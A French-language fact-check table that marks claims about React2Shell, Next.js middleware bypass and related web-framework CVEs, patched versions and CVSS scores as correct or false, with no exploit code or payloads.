| CVE-2025-55184 = React2Shell RCE | **FAUX.** CVE-2025-55184 = DoS. Le RCE est **CVE-2025-55182** (chiffres transposes) |
| CVE-2025-67779 = correctif DoS | **CORRECT.** Fix complet du DoS apres patch initial incomplet |
| React Router fix = 7.5.2 | **FAUX.** Le fix est **7.4.1** (NVD confirme) |
| Nuxt fix < 3.16.0 | **CORRECT.** Fix en 3.16.0 |
| Next.js fix 14.2.25 / 15.2.3 (middleware) | **CORRECT.** Confirme par Vercel postmortem |
| Next.js fix 15.0.5 / 15.5.7 / 16.0.7 (React2Shell) | **CORRECT.** Plus 15.1.9, 15.2.6, 15.3.6, 15.4.8 |
| "React2Shell" comme nom de vuln | **CORRECT.** Nom officiel utilise par Wiz, Microsoft, Cloudflare, Qualys |
| CVSS 10.0 pour React2Shell | **CORRECT.** Confirme NVD |
| CVSS 9.1 pour middleware bypass | **CORRECT.** Confirme NVD |
| PPR nonce incompatibility | **CORRECT.** Design concern confirme (GitHub issue #89754) + CVE-2025-59472 DoS additionnel |
| CSS attribute exfiltration | **CORRECT.** Technique documentee depuis 2018, toujours viable |
| Hydration state injection | **CORRECT.** Pattern reel, amplificateur XSS |
